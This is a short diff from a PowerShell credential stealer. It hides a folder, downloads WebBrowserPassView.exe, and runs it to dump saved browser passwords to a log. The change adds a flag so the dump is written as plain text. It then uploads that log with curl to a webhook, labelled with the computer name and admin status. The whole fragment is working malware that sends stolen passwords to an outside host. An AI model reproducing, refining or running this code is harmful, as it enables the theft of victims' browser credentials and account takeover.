@@ -37,7 +37,7 @@ if ($Admin -eq 'True') {
 $hide = Get-Item "$dir" -Force
 $hide.attributes='Hidden'
 Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\WebBrowserPassView.exe"
-& "$dir\WebBrowserPassView.exe" > "$log"
+& "$dir\WebBrowserPassView.exe" /stext > "$log"
 curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
 Start-Sleep -Seconds 20
 $unhide = Get-Item "$dir" -Force
